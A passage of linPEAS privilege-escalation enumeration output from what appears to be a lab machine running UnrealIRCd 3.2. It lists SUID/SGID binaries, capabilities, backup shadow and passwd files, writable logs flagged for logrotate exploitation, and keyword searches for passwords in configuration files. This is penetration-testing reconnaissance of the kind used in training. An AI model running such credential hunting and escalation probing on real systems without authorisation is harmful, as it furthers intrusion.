+-rwsr-xr-x 1 root root       63K Jul 27  2018 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
+-rwsr-xr-x 1 root root       44K Jul 27  2018 /usr/bin/newgrp  --->  HP-UX_10.20
+-rwsr-xr-x 1 root root       83K Jul 27  2018 /usr/bin/gpasswd
+-rwsr-xr-x 1 root root       44K Jul 27  2018 /usr/bin/chsh
+-rwsr-xr-x 1 root root       53K Jul 27  2018 /usr/bin/chfn  --->  SuSE_9.3/10
+-rwsr-xr-x 1 root root       35K Jan 10  2019 /usr/bin/umount  --->  BSD/Linux(08-1996)
+-rwsr-xr-x 1 root root       63K Jan 10  2019 /usr/bin/su
+-rwsr-xr-x 1 root root       51K Jan 10  2019 /usr/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
+-rwsr-xr-x 1 root root       35K Apr 22  2020 /usr/bin/fusermount
+-rwsr-xr-- 1 root messagebus 50K Jul  5  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+
+[+] SGID
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
+-rwxr-sr-x 1 root tty     15K May  4  2018 /usr/bin/bsd-write
+-rwxr-sr-x 1 root shadow  31K Jul 27  2018 /usr/bin/expiry
+-rwxr-sr-x 1 root shadow  71K Jul 27  2018 /usr/bin/chage
+-rwxr-sr-x 1 root tty     35K Jan 10  2019 /usr/bin/wall
+-rwxr-sr-x 1 root shadow  39K Feb 14  2019 /usr/sbin/unix_chkpwd
+-rwxr-sr-x 1 root crontab 43K Oct 11  2019 /usr/bin/crontab
+
+[+] Checking misconfigurations of ld.so
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#ld-so
+/etc/ld.so.conf
+include /etc/ld.so.conf.d/*.conf
+
+/etc/ld.so.conf.d
+  /etc/ld.so.conf.d/libc.conf
+/usr/local/lib
+  /etc/ld.so.conf.d/x86_64-linux-gnu.conf
+/usr/local/lib/x86_64-linux-gnu
+/lib/x86_64-linux-gnu
+/usr/lib/x86_64-linux-gnu
+
+[+] Capabilities
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities
+Current capabilities:
+Current: =
+CapInh:	0000000000000000
+CapPrm:	0000000000000000
+CapEff:	0000000000000000
+CapBnd:	0000003fffffffff
+CapAmb:	0000000000000000
+
+Shell capabilities:
+0x0000000000000000=
+CapInh:	0000000000000000
+CapPrm:	0000000000000000
+CapEff:	0000000000000000
+CapBnd:	0000003fffffffff
+CapAmb:	0000000000000000
+
+Files with capabilities:
+/usr/bin/ping = cap_net_raw+ep
+
+[+] Users with capabilities
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities
+/etc/security/capability.conf Not Found
+
+[+] Files with ACLs
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#acls
+files with acls in searched folders Not Found
+
+[+] .sh files in path
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#script-binaries-in-path
+/usr/bin/gettext.sh
+
+[+] Unexpected in root
+/lost+found
+/initrd.img.old
+/initrd.img
+/libx32
+/lib32
+/vmlinuz.old
+/vmlinuz
+
+[+] Files (scripts) in /etc/profile.d/
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#profiles-files
+total 8
+drwxr-xr-x  2 root root 4096 Feb  1  2020 .
+drwxr-xr-x 67 root root 4096 Dec  3 11:21 ..
+
+[+] Permissions in init, init.d, systemd, and rc.d
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#init-init-d-systemd-and-rc-d
+
+[+] Hashes inside passwd file? ........... No
+[+] Writable passwd file? ................ No
+[+] Credentials in fstab/mtab? ........... No
+[+] Can I read shadow files? ............. No
+[+] Can I read opasswd file? ............. No
+[+] Can I write in network-scripts? ...... No
+[+] Can I read root folder? .............. No
+
+[+] Searching root files in home dirs (limit 30)
+/home/
+/home/server/irc/Unreal3.2/ircdcron/ircdchk
+/home/server/irc/Unreal3.2/extras/c-ares.tar.gz.bak
+/home/server/irc/Unreal3.2/extras/c-ares
+/home/server/irc/Unreal3.2/extras/c-ares/share
+/home/server/irc/Unreal3.2/extras/c-ares/share/man
+/home/server/irc/Unreal3.2/extras/c-ares/share/man/man3
+/home/server/irc/Unreal3.2/extras/c-ares/share/man/man3/ares_expand_string.3
+/home/server/irc/Unreal3.2/extras/c-ares/share/man/man3/ares_process.3
+/home/server/irc/Unreal3.2/extras/c-ares/share/man/man3/ares_destroy_options.3
+/home/server/irc/Unreal3.2/extras/c-ares/share/man/man3/ares_gethostbyname.3
+/home/server/irc/Unreal3.2/extras/c-ares/share/man/man3/ares_parse_ns_reply.3
+/home/server/irc/Unreal3.2/extras/c-ares/share/man/man3/ares_init_options.3
+/home/server/irc/Unreal3.2/extras/c-ares/share/man/man3/ares_parse_ptr_reply.3
+/home/server/irc/Unreal3.2/extras/c-ares/share/man/man3/ares_parse_aaaa_reply.3
+/home/server/irc/Unreal3.2/extras/c-ares/share/man/man3/ares_getnameinfo.3
+/home/server/irc/Unreal3.2/extras/c-ares/share/man/man3/ares_set_socket_callback.3
+/home/server/irc/Unreal3.2/extras/c-ares/share/man/man3/ares_gethostbyaddr.3
+/home/server/irc/Unreal3.2/extras/c-ares/share/man/man3/ares_free_hostent.3
+/home/server/irc/Unreal3.2/extras/c-ares/share/man/man3/ares_free_string.3
+/home/server/irc/Unreal3.2/extras/c-ares/share/man/man3/ares_save_options.3
+/home/server/irc/Unreal3.2/extras/c-ares/share/man/man3/ares_fds.3
+/home/server/irc/Unreal3.2/extras/c-ares/share/man/man3/ares_getsock.3
+/home/server/irc/Unreal3.2/extras/c-ares/share/man/man3/ares_destroy.3
+/home/server/irc/Unreal3.2/extras/c-ares/share/man/man3/ares_dup.3
+/home/server/irc/Unreal3.2/extras/c-ares/share/man/man3/ares_send.3
+/home/server/irc/Unreal3.2/extras/c-ares/share/man/man3/ares_expand_name.3
+/home/server/irc/Unreal3.2/extras/c-ares/share/man/man3/ares_gethostbyname_file.3
+/home/server/irc/Unreal3.2/extras/c-ares/share/man/man3/ares_mkquery.3
+/home/server/irc/Unreal3.2/extras/c-ares/share/man/man3/ares_search.3
+
+[+] Searching folders owned by me containing others files on it
+
+[+] Readable files belonging to root and readable by me but not world readable
+
+[+] Modified interesting files in the last 5mins (limit 100)
+/var/log/daemon.log
+/var/log/syslog
+/var/log/auth.log
+
+[+] Writable log files (logrotten) (limit 100)
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#logrotate-exploitation
+logrotate 3.14.0
+
+    Default mail command:       /usr/bin/mail
+    Default compress command:   /bin/gzip
+    Default uncompress command: /bin/gunzip
+    Default compress extension: .gz
+    Default state file path:    /var/lib/logrotate/status
+    ACL support:                yes
+    SELinux support:            yes
+Writable: /home/server/irc/Unreal3.2/ircd.log
+Writable: /home/server/irc/Unreal3.2/config.log
+
+[+] Files inside /home/server (limit 20)
+total 32
+drwxr-xr-x 3 server server 4096 Dec  3 11:23 .
+drwxr-xr-x 3 root   root   4096 Aug  8  2020 ..
+lrwxrwxrwx 1 root   root      9 Aug  8  2020 .bash_history -> /dev/null
+-rw-r--r-- 1 server server  220 Aug  8  2020 .bash_logout
+-rw-r--r-- 1 server server 3526 Aug  8  2020 .bashrc
+drwxr-xr-x 3 server server 4096 Aug  8  2020 irc
+-rw-r--r-- 1 server server   33 May  8 12:54 local.txt
+-rw-r--r-- 1 server server  807 Aug  8  2020 .profile
+-rw-r--r-- 1 server server   66 Aug  8  2020 .selected_editor
+
+[+] Files inside others home (limit 20)
+
+[+] Searching installed mail applications
+
+[+] Mails (limit 50)
+
+[+] Backup folders
+drwxr-xr-x 2 root root 4096 May  8 13:01 /var/backups
+total 608
+-rw-r--r-- 1 root root    30720 Dec  3 11:20 alternatives.tar.0
+-rw-r--r-- 1 root root     1525 Aug  8  2020 alternatives.tar.1.gz
+-rw-r--r-- 1 root root     7676 Sep 20  2020 apt.extended_states.0
+-rw-r--r-- 1 root root      874 Aug  8  2020 apt.extended_states.1.gz
+-rw-r--r-- 1 root root      186 Aug  8  2020 dpkg.diversions.0
+-rw-r--r-- 1 root root      126 Aug  8  2020 dpkg.diversions.1.gz
+-rw-r--r-- 1 root root      126 Aug  8  2020 dpkg.diversions.2.gz
+-rw-r--r-- 1 root root      126 Aug  8  2020 dpkg.diversions.3.gz
+-rw-r--r-- 1 root root      100 Aug  8  2020 dpkg.statoverride.0
+-rw-r--r-- 1 root root      120 Aug  8  2020 dpkg.statoverride.1.gz
+-rw-r--r-- 1 root root      120 Aug  8  2020 dpkg.statoverride.2.gz
+-rw-r--r-- 1 root root      120 Aug  8  2020 dpkg.statoverride.3.gz
+-rw-r--r-- 1 root root   286279 Sep 20  2020 dpkg.status.0
+-rw-r--r-- 1 root root    81381 Sep 20  2020 dpkg.status.1.gz
+-rw-r--r-- 1 root root    81381 Sep 20  2020 dpkg.status.2.gz
+-rw-r--r-- 1 root root    72241 Aug  8  2020 dpkg.status.3.gz
+-rw------- 1 root root      749 Aug  8  2020 group.bak
+-rw------- 1 root shadow    635 Aug  8  2020 gshadow.bak
+-rw------- 1 root root     1440 Aug  8  2020 passwd.bak
+-rw------- 1 root shadow    950 Dec  3 11:21 shadow.bak
+
+
+[+] Backup files
+-rw-r--r-- 1 root root 363752 Apr 30  2018 /usr/share/doc/manpages/Changes.old.gz
+-rw-r--r-- 1 root root 43736 Oct  9  2019 /usr/lib/open-vm-tools/plugins/vmsvc/libvmbackup.so
+-rw-r--r-- 1 root root 9716 Apr 27  2020 /usr/lib/modules/4.19.0-8-amd64/kernel/drivers/net/team/team_mode_activebackup.ko
+-rw-r--r-- 1 root root 9716 Jul 24  2020 /usr/lib/modules/4.19.0-10-amd64/kernel/drivers/net/team/team_mode_activebackup.ko
+-rw------- 1 server server 262254 Jul  3  2004 /home/server/irc/Unreal3.2/Changes.old
+
+[+] Searching tables inside readable .db/.sql/.sqlite files (limit 100)
+
+[+] Web files?(output limit)
+
+[+] Readable hidden interesting files
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#read-sensitive-data
+
+[+] All hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)
+-rw-r--r-- 1 root root 0 Nov 15  2018 /usr/share/dictionaries-common/site-elisp/.nosearch
+-rw-r--r-- 1 root root 0 Dec 21 07:46 /run/network/.ifstate.lock
+-rw------- 1 server server 1645 Apr 24  2004 /home/server/irc/Unreal3.2/.CONFIG.RANT
+-rw------- 1 server server 794 Aug 20  2000 /home/server/irc/Unreal3.2/.indent.pro
+-rw------- 1 server server 519 Dec 10  2000 /home/server/irc/Unreal3.2/.UPDATE
+-rw------- 1 server server 1060 Apr 24  2004 /home/server/irc/Unreal3.2/.SICI
+-rw------- 1 server server 2791 Apr 24  2004 /home/server/irc/Unreal3.2/.bugreport.gdb
+-rw------- 1 server server 2 Apr 24  2004 /home/server/irc/Unreal3.2/keys/.KEYS
+-rw------- 1 server server 5623 Apr 13  2009 /home/server/irc/Unreal3.2/.RELEASE.NOTES
+-rw------- 1 server server 124 Apr 24  2004 /home/server/irc/Unreal3.2/.cvsignore
+-rw------- 1 server server 932 Apr 13  2009 /home/server/irc/Unreal3.2/.CHANGES.NEW
+-rw-r--r-- 1 server server 3526 Aug  8  2020 /home/server/.bashrc
+-rw-r--r-- 1 server server 807 Aug  8  2020 /home/server/.profile
+-rw-r--r-- 1 server server 66 Aug  8  2020 /home/server/.selected_editor
+-rw-r--r-- 1 server server 220 Aug  8  2020 /home/server/.bash_logout
+-rw------- 1 root root 0 Aug  8  2020 /etc/.pwd.lock
+-rw-r--r-- 1 root root 102 Oct 11  2019 /etc/cron.monthly/.placeholder
+-rw-r--r-- 1 root root 102 Oct 11  2019 /etc/cron.hourly/.placeholder
+-rw-r--r-- 1 root root 3526 Apr 18  2019 /etc/skel/.bashrc
+-rw-r--r-- 1 root root 807 Apr 18  2019 /etc/skel/.profile
+-rw-r--r-- 1 root root 220 Apr 18  2019 /etc/skel/.bash_logout
+-rw-r--r-- 1 root root 102 Oct 11  2019 /etc/cron.d/.placeholder
+-rw-r--r-- 1 root root 102 Oct 11  2019 /etc/cron.weekly/.placeholder
+-rw-r--r-- 1 root root 102 Oct 11  2019 /etc/cron.daily/.placeholder
+
+[+] Readable files inside /tmp, /var/tmp, /private/tmp, /private/var/at/tmp, /private/var/tmp, and backup folders (limit 70)
+-rwx------ 1 server server 332111 May  8 13:09 /tmp/linpeas.sh
+-rw------- 1 server server 83317 May  8 13:11 /tmp/linpeas_results
+-rw-r--r-- 1 root root 81381 Sep 20  2020 /var/backups/dpkg.status.1.gz
+-rw-r--r-- 1 root root 72241 Aug  8  2020 /var/backups/dpkg.status.3.gz
+-rw-r--r-- 1 root root 126 Aug  8  2020 /var/backups/dpkg.diversions.1.gz
+-rw-r--r-- 1 root root 286279 Sep 20  2020 /var/backups/dpkg.status.0
+-rw-r--r-- 1 root root 30720 Dec  3 11:20 /var/backups/alternatives.tar.0
+-rw-r--r-- 1 root root 120 Aug  8  2020 /var/backups/dpkg.statoverride.2.gz
+-rw-r--r-- 1 root root 126 Aug  8  2020 /var/backups/dpkg.diversions.2.gz
+-rw-r--r-- 1 root root 126 Aug  8  2020 /var/backups/dpkg.diversions.3.gz
+-rw-r--r-- 1 root root 100 Aug  8  2020 /var/backups/dpkg.statoverride.0
+-rw-r--r-- 1 root root 120 Aug  8  2020 /var/backups/dpkg.statoverride.3.gz
+-rw-r--r-- 1 root root 7676 Sep 20  2020 /var/backups/apt.extended_states.0
+-rw-r--r-- 1 root root 81381 Sep 20  2020 /var/backups/dpkg.status.2.gz
+-rw-r--r-- 1 root root 874 Aug  8  2020 /var/backups/apt.extended_states.1.gz
+-rw-r--r-- 1 root root 186 Aug  8  2020 /var/backups/dpkg.diversions.0
+-rw-r--r-- 1 root root 1525 Aug  8  2020 /var/backups/alternatives.tar.1.gz
+-rw-r--r-- 1 root root 120 Aug  8  2020 /var/backups/dpkg.statoverride.1.gz
+
+[+] Interesting writable files owned by me or writable by everyone (not in Home) (max 500)
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files
+/dev/mqueue
+/dev/shm
+/home/server
+/run/lock
+/tmp
+/tmp/.font-unix
+/tmp/.ICE-unix
+/tmp/linpeas_results
+/tmp/linpeas.sh
+/tmp/.Test-unix
+#)You_can_write_even_more_files_inside_last_directory
+
+/var/tmp
+
+[+] Interesting GROUP writable files (not in Home) (max 500)
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files
+  Group server:
+
+  Group cdrom:
+
+  Group floppy:
+
+  Group audio:
+
+  Group dip:
+
+  Group video:
+
+  Group plugdev:
+
+  Group netdev:
+
+  Group bluetooth:
+
+
+[+] Searching passwords in config PHP files
+
+[+] Checking for TTY (sudo/su) passwords in audit logs
+
+[+] Finding IPs inside logs (limit 70)
+
+[+] Finding passwords inside logs (limit 70)
+
+[+] Finding emails inside logs (limit 70)
+
+[+] Finding *password* or *credential* files in home (limit 70)
+
+[+] Finding passwords inside key folders (limit 70) - only PHP files
+
+[+] Finding passwords inside key folders (limit 70) - no PHP files
+/etc/debconf.conf:#BindPasswd: secret
+/etc/nsswitch.conf:passwd:         files
+/etc/pam.d/common-password:password	[success=1 default=ignore]	pam_unix.so obscure sha512
+/etc/security/namespace.init:                gid=$(echo "$passwd" | cut -f4 -d":")
+/etc/security/namespace.init:        homedir=$(echo "$passwd" | cut -f6 -d":")
+/etc/security/namespace.init:        passwd=$(getent passwd "$user")
+/etc/ssl/openssl.cnf:challengePassword		= A challenge password
+/etc/ssl/openssl.cnf:challengePassword_max		= 20
+/etc/ssl/openssl.cnf:challengePassword_min		= 4
+/etc/ssl/openssl.cnf:# input_password = secret
+/etc/ssl/openssl.cnf:# output_password = secret
+/etc/vmware-tools/vm-support:         sed 's/password[[:space:]]\+\(.*\)[[:space:]]\+\(.*\)$/password  xxxxxx/g' > \
+/home/server/irc/Unreal3.2/Changes.old:- Added IRCu .ack patch you can now use "ONE" in password line in I:Lines
+/home/server/irc/Unreal3.2/Changes.old:- Made allow {} passwords work (AllowClient) - TODO: I:line encryptions
+/home/server/irc/Unreal3.2/Changes.old:- Made it so you can encrypt restart/die passwords (same as I:line passwords)
+/home/server/irc/Unreal3.2/Changes.old:- Wildcards like C:*:password:*::32 must be the only one in the file
+/home/server/irc/Unreal3.2/Changes:  We now support the webirc ('webirc_password' in CGI:IRC) method, which is kinda superior
+/home/server/irc/Unreal3.2/config.log:MKPASSWDLIBS='-lcrypt'
+/home/server/irc/Unreal3.2/config.status:ac_pwd='/home/server/irc/Unreal3.2'
+/home/server/irc/Unreal3.2/configure:ac_pwd='$ac_pwd'
+/home/server/irc/Unreal3.2/configure:ac_pwd_ls_di=`cd "$ac_pwd" && ls -di .` ||
+/home/server/irc/Unreal3.2/configure:ac_pwd=`pwd` && test -n "$ac_pwd" &&
+/home/server/irc/Unreal3.2/configure:    cd "$ac_pwd" || { ac_status=$?; break; }
+/home/server/irc/Unreal3.2/configure: IRCDLIBS="$IRCDLIBS-lcrypt " MKPASSWDLIBS="-lcrypt"
+/home/server/irc/Unreal3.2/configure: IRCDLIBS="$IRCDLIBS-ldescrypt " MKPASSWDLIBS="-ldescrypt"
+/home/server/irc/Unreal3.2/curlinstall:save_PWD=`pwd`
+/home/server/irc/Unreal3.2/doc/help.fr.conf:	" ex: pour oper::password, vhost::password, etc.";
+/home/server/irc/Unreal3.2/doc/unreal32docs.de.html:  <pre>realhost_as_password = 1</pre>
+/home/server/irc/Unreal3.2/doc/unreal32docs.de.html:  <pre>webirc_password = LpT4xqPI5</pre>
+/home/server/irc/Unreal3.2/doc/unreal32docs.es.html:<pre>realhost_as_password = 1</pre>
+/home/server/irc/Unreal3.2/doc/unreal32docs.es.html:<pre>webirc_password = LpT4xqPI5</pre>
+/home/server/irc/Unreal3.2/doc/unreal32docs.fr.html:<pre>realhost_as_password = 1</pre>
+/home/server/irc/Unreal3.2/doc/unreal32docs.fr.html:<pre>webirc_password = LpT4xqPI5</pre>
+/home/server/irc/Unreal3.2/doc/unreal32docs.gr.html:  	 </p><pre>realhost_as_password = 1</pre>
+/home/server/irc/Unreal3.2/doc/unreal32docs.gr.html:  	 </p><pre>webirc_password = LpT4xqPI5</pre>
+/home/server/irc/Unreal3.2/doc/unreal32docs.html:Choose good oper passwords, link passwords, etc:<br>
+/home/server/irc/Unreal3.2/doc/unreal32docs.html:  must be entered. The vhost::password:: allows you to specify the type of 
+/home/server/irc/Unreal3.2/doc/unreal32docs.html:  must specify, oper::password:: allows you to specify an authentication method 
+/home/server/irc/Unreal3.2/doc/unreal32docs.html:<p><b><font size="+2">8.1 Passwords</font></b><a name="secpasswords"></a><br><div class="desc">
+/home/server/irc/Unreal3.2/doc/unreal32docs.html:<pre>realhost_as_password = 1</pre>
+/home/server/irc/Unreal3.2/doc/unreal32docs.html:<pre>webirc_password = LpT4xqPI5</pre>
+/home/server/irc/Unreal3.2/doc/unreal32docs.html:<p>This block sets the /restart and /die passwords with drpass::restart and drpass::die 
+/home/server/irc/Unreal3.2/doc/unreal32docs.html:specify a server password as a CGI:IRC user. Additionally, access control is only
+/home/server/irc/Unreal3.2/doc/unreal32docs.hu.html:<p><b><font size="+2">8.1. Jelszavak</font></b><a name="secpasswords"></a><br><div class="desc">
+/home/server/irc/Unreal3.2/doc/unreal32docs.hu.html:<pre>realhost_as_password = 1</pre>
+/home/server/irc/Unreal3.2/doc/unreal32docs.hu.html:<pre>webirc_password = LpT4xqPI5</pre>
+/home/server/irc/Unreal3.2/doc/unreal32docs.nl.html: gebruiken, laat je oper::password:: weg.</p>
+/home/server/irc/Unreal3.2/doc/unreal32docs.nl.html:<p><b><font size="+2">8.1 Wachtwoorden</font></b><a name="secpasswords"></a><br><div class="desc">
+/home/server/irc/Unreal3.2/doc/unreal32docs.nl.html:<pre>realhost_as_password = 1</pre>	
+/home/server/irc/Unreal3.2/doc/unreal32docs.nl.html:<pre>webirc_password = LpT4xqPI5</pre>
+/home/server/irc/Unreal3.2/doc/unreal32docs.nl.html: van de gebruiker. oper::password:: geeft je de mogelijkheid om een authenticatie-methode
+/home/server/irc/Unreal3.2/doc/unreal32docs.nl.html: vhost::password:: kun je een authenticatie type opgeven. Op dit moment kan dat zijn;
+/home/server/irc/Unreal3.2/doc/unreal32docs.ru.html:							<pre>realhost_as_password = 1</pre>
+/home/server/irc/Unreal3.2/doc/unreal32docs.ru.html:							<pre>webirc_password = LpT4xqPI5</pre>
+/home/server/irc/Unreal3.2/extras/burst.c:  password = argv[5];
+/home/server/irc/Unreal3.2/extras/c-ares-1.6.0/aclocal.m4:if test "`cd $srcdir && pwd`" != "`pwd`" &&
+/home/server/irc/Unreal3.2/extras/c-ares-1.6.0/config.status:ac_pwd='/home/server/irc/Unreal3.2/extras/c-ares-1.6.0'
+/home/server/irc/Unreal3.2/extras/c-ares-1.6.0/configure:ac_pwd='$ac_pwd'
+/home/server/irc/Unreal3.2/extras/c-ares-1.6.0/configure:ac_pwd_ls_di=`cd "$ac_pwd" && ls -di .` ||
+/home/server/irc/Unreal3.2/extras/c-ares-1.6.0/configure:ac_pwd=`pwd` && test -n "$ac_pwd" &&
+/home/server/irc/Unreal3.2/extras/c-ares-1.6.0/configure:    cd "$ac_pwd" || { ac_status=$?; break; }
+/home/server/irc/Unreal3.2/extras/c-ares-1.6.0/configure:if test "`cd $srcdir && pwd`" != "`pwd`" &&
+/home/server/irc/Unreal3.2/extras/c-ares-1.6.0/configure.lineno:ac_pwd='$ac_pwd'
+/home/server/irc/Unreal3.2/extras/c-ares-1.6.0/configure.lineno:ac_pwd_ls_di=`cd "$ac_pwd" && ls -di .` ||
+/home/server/irc/Unreal3.2/extras/c-ares-1.6.0/configure.lineno:ac_pwd=`pwd` && test -n "$ac_pwd" &&
+/home/server/irc/Unreal3.2/extras/c-ares-1.6.0/configure.lineno:    cd "$ac_pwd" || { ac_status=$?; break; }
+/home/server/irc/Unreal3.2/extras/c-ares-1.6.0/configure.lineno:if test "`cd $srcdir && pwd`" != "`pwd`" &&
+/home/server/irc/Unreal3.2/extras/c-ares-1.6.0/Makefile:	dc_install_base=`$(am__cd) $(distdir)/_inst && pwd | sed -e 's,^[^:\/]:[\/],/,'` \
+/home/server/irc/Unreal3.2/extras/c-ares-1.6.0/Makefile.in:	dc_install_base=`$(am__cd) $(distdir)/_inst && pwd | sed -e 's,^[^:\/]:[\/],/,'` \
+/home/server/irc/Unreal3.2/extras/tre-0.7.5/aclocal.m4:if test "`cd $srcdir && pwd`" != "`pwd`" &&
+
+[+] Finding possible password variables inside key folders (limit 140)
+
+[+] Finding possible password in config files
+ /home/server/irc/Unreal3.2/help.conf
+PASSWD        SDESC           ZLINE";
+password>";
+password>";
+password are case sensitive";
+password>";
+password> <reason>";
+password>";
+passwd {
+passwords in your configuration file:";
+password, vhost::password, etc.";
+PASSWD <method> <password>";
+PASSWD md5 IamTeh1337";
+ /home/server/irc/Unreal3.2/doc/help.de.conf
+PASSWD        SDESC           ZLINE";
+Passwort <key> angeben, um im Channel zu joinen [h]";
+Passworte) mit angegeben, so";
+password>";
+password>";
+Passwort sind case sensitive ";
+password>";
+password> <reason>";
+password>";
+passwd {
+Passworte in die conf Datei einbauen";
+passwort, vhost::passwort etc.";
+PASSWD <method> <password>";
+PASSWD md5 IamTeh1337";
+ /home/server/irc/Unreal3.2/doc/help.fr.conf
+PASSWD        SDESC           ZLINE";
+passwd {
+password, vhost::password, etc.";
+PASSWD <m
+PASSWD md5 IamTeh1337";
+ /home/server/irc/Unreal3.2/doc/help.ru.conf
+PASSWD        SDESC           ZLINE";
+passwd {
+password, vhost::password, 
+PASSWD <
+PASSWD md5 IamTeh1337";
+ /home/server/irc/Unreal3.2/doc/help.tr.conf
+PASSWD        SDESC           ZLINE";
+passwd {
+PASSWD <metod> <
+PASSWD md5 IamTeh1337";
+ /etc/nsswitch.conf
+passwd:         files
+ /etc/adduser.conf
+passwd
+ /etc/debconf.conf
+passwords.
+password
+passwords.
+passwords
+password
+passwords.dat
+passwords and one for everything else.
+passwords
+password is really
+Passwd: secret
+
+[+] Finding 'username' string inside key folders (limit 70)
+/home/server/irc/Unreal3.2/Changes:  <nickname> <username> <hostname> <awaysince> :<away reason>
+/home/server/irc/Unreal3.2/Changes:  <nickname> <username> <hostname> <awaysince> :is no longer away
+/home/server/irc/Unreal3.2/src/cidr.c:			strlcpy(username, uhost, end-uhost+1 > USERLEN+1 ? USERLEN+1 : end-uhost+1);
+/home/server/irc/Unreal3.2/src/hash.c:				    	(IsPerson(cptr) ? cptr->user->username : "<N/A>"),
+/home/server/irc/Unreal3.2/src/hash.c:				    (IsPerson(cptr) ? cptr->user->username : "<N/A>"),
+/home/server/irc/Unreal3.2/src/ircd.c:				    user ? cptr->user->username : cptr->
+/home/server/irc/Unreal3.2/src/modules/m_nick.c:				    sptr->user ? sptr->username : "",
+/home/server/irc/Unreal3.2/src/modules/m_nick.c:			    sptr->user->username, NULL, NULL, NULL) == FLUSH_BUFFER)
+/home/server/irc/Unreal3.2/src/modules/m_nick.c:				*user->username = '~';
+/home/server/irc/Unreal3.2/src/modules/m_nick.c:			user->username[0] = '~';
+/home/server/irc/Unreal3.2/src/modules/m_nick.c:			user->username[USERLEN] = '\0';
+/home/server/irc/Unreal3.2/src/modules/m_oper.c:				sptr->user->username[c-host] = 0;
+/home/server/irc/Unreal3.2/src/modules/m_stats.c:			me.name, sptr->name, IsOper(sptr) ? link_p->username : "*",
+/home/server/irc/Unreal3.2/src/modules/m_tkl.c:	cname = cptr->user ? cptr->user->username : "unknown";
+/home/server/irc/Unreal3.2/src/modules/m_tkl.c:				sptr->user ? sptr->user->username : "unknown",
+/home/server/irc/Unreal3.2/src/modules/m_user.c:	char *username, *host, *server, *realname, *umodex = NULL, *virthost =
+/home/server/irc/Unreal3.2/src/modules/m_user.c:	if (parc > 2 && (username = (char *)index(parv[1], '@')))
+/home/server/irc/Unreal3.2/src/modules/m_user.c:		*username = '\0';
+/home/server/irc/Unreal3.2/src/modules/m_user.c:	username = (parc < 2 || BadPtr(parv[1])) ? "<bad-boy>" : parv[1];
+/home/server/irc/Unreal3.2/src/modules/m_user.c:			username[USERLEN] = '\0'; /* cut-off */
+/home/server/irc/Unreal3.2/src/modules/m_whois.c:					(MyConnect(acptr) && strcmp(acptr->username, "unknown")) ? acptr->username : "*",
+/home/server/irc/Unreal3.2/src/s_bsd.c:			    cptr->user ? cptr->user->username : "*",
+/home/server/irc/Unreal3.2/src/s_conf.c:			cgiirc->username = strdup(cep->ce_vardata);
+/home/server/irc/Unreal3.2/src/s_conf.c:	char has_username = 0; /* dup checking only, not mandatory */
+/home/server/irc/Unreal3.2/src/s_conf.c:	char has_username = 0, has_hostname = 0, has_bindip = 0, has_port = 0;
+/home/server/irc/Unreal3.2/src/s_conf.c:			has_username = 1;
+/home/server/irc/Unreal3.2/src/s_conf.c:			link->username = strdup(cep->ce_vardata);
+/home/server/irc/Unreal3.2/src/send.c:		    user->username, user->realhost, user->ip_str ? user->ip_str : "0");
+/home/server/irc/Unreal3.2/src/s_svs.c:							sptr->user->username, IsHidden(sptr) ? sptr->user->virthost : sptr->user->realhost,
+
+[+] Searching specific hashes inside files - less false positives (limit 70)
+
